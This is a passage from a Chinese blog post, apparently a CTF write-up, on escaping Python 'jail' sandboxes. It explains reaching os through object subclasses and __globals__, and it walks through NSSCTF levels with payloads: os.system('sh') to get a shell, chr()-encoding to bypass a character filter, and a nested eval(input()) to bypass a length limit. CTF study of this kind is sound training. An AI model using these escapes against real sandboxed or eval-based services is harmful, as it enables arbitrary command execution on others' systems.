<span class="token punctuation">(</span><span class="token number">160</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools._tee_dataobject'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">161</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'operator.itemgetter'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">162</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'operator.attrgetter'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">163</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'operator.methodcaller'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">164</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'reprlib.Repr'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">165</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'collections.deque'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">166</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_collections._deque_iterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">167</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_collections._deque_reverse_iterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">168</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_collections._tuplegetter'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">169</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'collections._Link'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">170</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'functools.partial'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">171</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'functools._lru_cache_wrapper'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">172</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'functools.partialmethod'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">173</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'functools.singledispatchmethod'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">174</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'functools.cached_property'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">175</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'contextlib.ContextDecorator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">176</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'contextlib._GeneratorContextManagerBase'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">177</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'contextlib._BaseExitStack'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">178</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'enum.auto'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">179</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span>enum <span class="token string">'Enum'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">180</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'re.Pattern'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">181</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'re.Match'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">182</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_sre.SRE_Scanner'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">183</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'sre_parse.State'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">184</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'sre_parse.SubPattern'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">185</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'sre_parse.Tokenizer'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">186</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'re.Scanner'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">187</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'typing._Final'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">188</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'typing._Immutable'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">189</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'typing.Generic'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">190</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'typing._TypingEmpty'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">191</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'typing._TypingEllipsis'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">192</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'typing.Annotated'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">193</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'typing.NamedTuple'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">194</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'typing.TypedDict'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">195</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'typing.io'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">196</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'typing.re'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">197</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'importlib.abc.Finder'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">198</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'importlib.abc.Loader'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">199</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'importlib.abc.ResourceReader'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_distutils_hack._TrivialRe'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">201</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_distutils_hack.DistutilsMetaFinder'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">202</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_distutils_hack.shim'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">203</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'rlcompleter.Completer'</span><span class="token operator">></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里的子类有什么用呢？首先，在无法直接引入 os 的情况下，我们可以 import 一个已经导入了 os 的包来调用 os，例如 <code>site</code> 模块：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> site
<span class="token operator">>></span><span class="token operator">></span> site<span class="token punctuation">.</span>os
<span class="token operator">&lt;</span>module <span class="token string">'os'</span> <span class="token keyword">from</span> <span class="token string">'/Applications/Xcode.app/Contents/Developer/Library/Frameworks/Python3.framework/Versions/3.9/lib/python3.9/os.py'</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这是在模块中导入另一个模块的方式，如果是调用了一个目标模块下的类，则需要用到 <code>__globals__</code></p>
<p>对于上面获取的子类，由于 <code>&#39;&#39;.__class__.__base__.__subclasses__()</code> 返回的是一个 list，只能用索引进行访问，恰巧其中有一个<br><code>os._wrap_close</code> 类，接下来我们需要获取它导入的 os 模块，这里需要用到 <code>__globals__</code></p>
<blockquote>
<p><code>__globals__</code> 是一个特殊属性，能够以 dict 的形式返回<strong>函数</strong>（注意是函数）所在模块命名空间的所有变量，其中包含了很多已经引入的 modules。<br>某些内置函数并没有 <code>__globals__</code> 属性，因为这些函数并不是 Python 代码定义的，而是用 C 语言或其他底层语言实现的： <code>builtin_function_or_method</code> 或者是 <code>wrapper_descriptor</code> 、<code>method-wrapper</code> 类型的函数，例如 <code>range</code>、<code>range.__init__</code>、<code>&#39;&#39;.split</code> 、<code>os.system</code>  等等</p>
</blockquote>
<p>在使用 <code>__globals__</code> 之前，我们需要先实例化这个类的构造函数，即 <code>__init__</code>，然后再获取它的 __globals__</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">133</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__
<span class="token operator">&lt;</span>function _wrap_close<span class="token punctuation">.</span>__init__ at <span class="token number">0x100854160</span><span class="token operator">></span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">133</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__
<span class="token punctuation">&#123;</span><span class="token string">'__name__'</span><span class="token punctuation">:</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">:</span> <span class="token string">"..."</span><span class="token punctuation">,</span> <span class="token string">'__package__'</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'__loader__'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>_frozen_importlib_external<span class="token punctuation">.</span>SourceFileLoader <span class="token builtin">object</span> at <span class="token number">0x10080a310</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'__spec__'</span><span class="token punctuation">:</span> ModuleSpec<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'os'</span><span class="token punctuation">,</span> loader<span class="token operator">=</span><span class="token operator">&lt;</span>_frozen_importlib_external<span class="token punctuation">.</span>SourceFileLoader <span class="token builtin">object</span> at <span class="token number">0x10080a310</span><span class="token operator">></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token string">'system'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>function system at <span class="token number">0x100854550</span><span class="token operator">></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token string">'popen'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>function popen at <span class="token number">0x100854040</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到这里面直接包含了 system 等一系列函数，那么就可以直接调用它命令执行</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">133</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<br>

<p>自动化构造类：使用列表推导式就可以在不知道类的索引的情况下，获取符合条件的类并执行</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span> x<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__ <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token string">"wrapper"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>__init__<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token string">"os"</span> <span class="token keyword">in</span> x<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"os"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<hr>
<h1 id="Audit-Hook"><a href="#Audit-Hook" class="headerlink" title="Audit Hook"></a>Audit Hook</h1><p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/16228">https://xz.aliyun.com/t/16228</a></p>
<p>audit hook 是 Python 3.8 中引入的新特性。</p>
<p>使用审计钩子来监控和记录 Python 程序在运行时的行为，特别是那些安全敏感的行为，如文件的读写、网络通信和动态代码的执行等。和 java 的 rasp 有点类似</p>
<p>Python 中的审计事件包括但不限于以下几类：<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.8/library/audit_events.html">审计事件表 — Python 3.8.20 文档</a></p>
<ul>
<li><code>import</code>：发生在导入模块时。</li>
<li><code>open</code>：发生在打开文件时。</li>
<li><code>exec</code>：发生在执行Python代码时。</li>
<li><code>compile</code>：发生在编译Python代码时。</li>
<li><code>socket</code>：发生在创建或使用网络套接字时。</li>
<li><code>os.system</code>，<code>os.popen</code>等：发生在执行操作系统命令时。</li>
<li><code>subprocess.Popen</code>，<code>subprocess.run</code>等：发生在启动子进程时</li>
</ul>
<hr>
<h1 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h1><h2 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h2><h2 id="gc"><a href="#gc" class="headerlink" title="gc"></a>gc</h2><hr>
<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="beginner"><a href="#beginner" class="headerlink" title="beginner"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2909">beginner</a></h2><p>启动靶机，下载附件</p>
<p>获得python源码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#Your goal is to read ./flag.txt</span>
<span class="token comment">#You can use these payload liked `__import__('os').system('cat ./flag.txt')` or `print(open('/flag.txt').read())`</span>

WELCOME <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
  _     ______      _                              _       _ _ 
 | |   |  ____|    (_)                            | |     (_) |
 | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |
 | '_ \|  __| / _` | | '_ \| '_ \ / _ \ '__|  _   | |/ _` | | |
 | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |
 |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|
               __/ |                                           
              |___/                                            
'''</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>WELCOME<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to the python jail"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Let's have an beginner jail of calc"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter your expression and I will evaluate it for you."</span><span class="token punctuation">)</span>
input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Answer: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现存在<code>eval</code>可以对输入的内容进行命令执行</p>
<p>nc连上靶机，可以看到提供了一个python交互环境</p>
<p>于是我们载入os模块进行命令执行，查目录，拿flag</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">__import__<span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span>.system<span class="token punctuation">(</span><span class="token string">'sh'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/06/07/python-jail/image-20230607115540253.png" alt="image-20230607115540253"></p>
<hr>
<h2 id="python2-input-JAIL"><a href="#python2-input-JAIL" class="headerlink" title="python2 input(JAIL)"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2913">python2 input(JAIL)</a></h2><blockquote>
<p>python2</p>
</blockquote>
<p>题目源码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># It's escape this repeat!</span>

WELCOME <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
              _   _      ___        ___    _____             _    _ _   
             | | | |    / _ \      |__ \  |_   _|           | |  | | |  
  _ __  _   _| |_| |__ | | | |_ __    ) |   | |  _ __  _ __ | |  | | |_ 
 | '_ \| | | | __| '_ \| | | | '_ \  / /    | | | '_ \| '_ \| |  | | __|
 | |_) | |_| | |_| | | | |_| | | | |/ /_   _| |_| | | | |_) | |__| | |_ 
 | .__/ \__, |\__|_| |_|\___/|_| |_|____| |_____|_| |_| .__/ \____/ \__|
 | |     __/ |                                        | |               
 |_|    |___/                                         |_|                               
'''</span>

<span class="token keyword">print</span> WELCOME

<span class="token keyword">print</span> <span class="token string">"Welcome to the python jail"</span>
<span class="token keyword">print</span> <span class="token string">"But this program will repeat your messages"</span>
input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> input_data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>语法上很明显是python2语法</p>
<ul>
<li>在python 2中，<code>input</code>函数从标准输入接收输入，并且自动<code>eval</code>求值，返回求出来的值；</li>
<li>在python 2中，<code>raw_input</code>函数从标准输入接收输入，返回输入字符串；</li>
<li>在python 3中，<code>input</code>函数从标准输入接收输入，返回输入字符串；</li>
<li>可以认为，python 2 <code>input()</code> &#x3D; python 2 <code>eval(raw_input())</code> &#x3D; python 3 <code>eval(input())</code></li>
</ul>
<p>这题没有限制和过滤</p>
<p>直接命令执行即可</p>
<p><img src="/blog/2023/06/07/python-jail/image-20230609195756589.png" alt="image-20230609195756589"></p>
<hr>
<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2910">level 1</a></h2><blockquote>
<p>chr()</p>
</blockquote>
<p>跟beginner比起来多加了过滤</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">filter</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    not_allowed <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'"\'`ib'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token builtin">any</span><span class="token punctuation">(</span>c <span class="token keyword">in</span> not_allowed <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">)</span>
input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token builtin">filter</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Oh hacker!"</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Answer: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>能通过<code>eval</code>执行任意命令，但是命令不能包含双引号、单引号、反引号、字母<code>i</code>和字母<code>b</code></p>
<p>这个时候可以考虑用字符编码来进行绕过</p>
<p>附上生成脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 原始字符串</span>
character <span class="token operator">=</span> <span class="token string">"__import__('os').system('ls')"</span>

<span class="token comment"># 获取字符串的 ASCII 码值，并转换为对应的字符</span>
ascii_chars <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> character<span class="token punctuation">]</span>

<span class="token comment"># 输出结果，拼接成 "chr()+chr()+..." 的形式</span>
ascii_str <span class="token operator">=</span> <span class="token string">"+"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"chr(</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> character<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>ascii_str<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"对应的字符为 &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>ascii_str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>之后和上题一样传入即可</p>
<p>注意要带上<code>eval()</code>，才能进行命令执行，否则只是输出拼接结果</p>
<p><img src="/blog/2023/06/07/python-jail/image-20230607201257446.png" alt="image-20230607201257446"></p>
<hr>
<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2911">level 2</a></h2><blockquote>
<p>限制长度+逃逸</p>
</blockquote>
<p>跟beginner比起来多了个长度限制13</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">13</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Oh hacker!"</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>我们最终要执行的语句</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">__import__<span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span>.system<span class="token punctuation">(</span><span class="token string">'sh'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>长度明显会超过13</p>
<p>但是我们知道在php命令执行中存在一种绕过方法是<strong>利用参数进行逃逸</strong></p>
<p>例如：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">?cmd=system($_POST[1]);&amp;1=ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>python交互环境下也是如此</p>
<p>因为长度限制只针对<code>input_data = input(&quot;&gt; &quot;)</code></p>
<p>所以只要我们再套一层eval语句</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>就可以再执行一次input，此时这个输入语句是不受长度限制的</p>
<p>从而我们可以拿到shell</p>
<p><img src="/blog/2023/06/07/python-jail/image-20230608184453373.png" alt="image-20230608184453373"></p>
<hr>
<h2 id="level-2-5"><a href="#level-2-5" class="headerlink" title="level 2.5"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2944">level 2.5</a></h2><blockquote>
<p>breakpoint()</p>
</blockquote>
<p>和level2比起来多加了一次关键词过滤</p>
